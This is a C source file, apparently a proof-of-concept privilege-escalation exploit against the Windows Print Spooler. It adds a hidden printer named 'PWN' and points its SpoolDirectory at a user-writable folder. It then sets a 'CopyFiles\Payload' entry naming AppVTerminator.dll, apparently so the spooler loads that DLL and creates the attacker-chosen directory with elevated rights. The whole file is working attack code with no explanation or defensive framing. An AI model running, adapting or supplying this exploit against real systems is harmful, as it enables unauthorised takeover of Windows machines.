#include <windows.h>
#include <stdio.h>
LPWSTR g_DriverName = L"Generic / Text Only";
LPWSTR g_PrinterName = L"PWN";
int main()
{
    PRINTER_INFO_2 printerInfo;
    HANDLE hPrinter;
    DWORD dwStatus;
    // AddPrinter
    memset(&printerInfo, 0, sizeof(printerInfo));
    printerInfo.pPrinterName = g_PrinterName;
    printerInfo.pDriverName = L"Microsoft Print To PDF";
    printerInfo.pPortName = L"PORTPROMPT:";
    printerInfo.pPrintProcessor = L"winprint";
    printerInfo.pDatatype = L"RAW";
    printerInfo.Attributes = PRINTER_ATTRIBUTE_HIDDEN;
    CreateDirectory(L"C:\\Users\\Public\\tmp", NULL);
    hPrinter = AddPrinter(NULL, 2, (LPBYTE)&printerInfo);
    LPWSTR pszDriverPath = L"C:\\Users\\Public\\tmp\\1";
    
    DWORD cbData;
    if (hPrinter == NULL)
    {
        printf("Failed: AddPrinter(), %ls. Error: %d\n", g_PrinterName, GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }
    //Set SpoolDirectory
    cbData = ((DWORD)wcslen(pszDriverPath) + 1) * sizeof(WCHAR);
    dwStatus = SetPrinterDataEx(hPrinter, L"\\", L"SpoolDirectory", REG_SZ, (LPBYTE)pszDriverPath, cbData);

    if (dwStatus != ERROR_SUCCESS)
    {
        printf("Failed: SetPrinterDataEx(), SpoolDirectory. Error: %d\n", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }
    //Load AppVTerminator.dll
    CreateDirectory(pszDriverPath, NULL);
    cbData = ((DWORD)wcslen(L"AppVTerminator.dll") + 1) * sizeof(WCHAR);
    dwStatus = SetPrinterDataEx(hPrinter, L"CopyFiles\\Payload", L"Module", REG_SZ, (LPBYTE)L"AppVTerminator.dll", cbData);

    if (dwStatus != RPC_S_CALL_FAILED)
    {
        printf("Failed: SetPrinterDataEx(), %ls. Error: %d\n", L"AppVTerminator.dll", GetLastError());
        ClosePrinter(hPrinter);
        return -1;
    }
    ClosePrinter(hPrinter);
    
    return 0;
}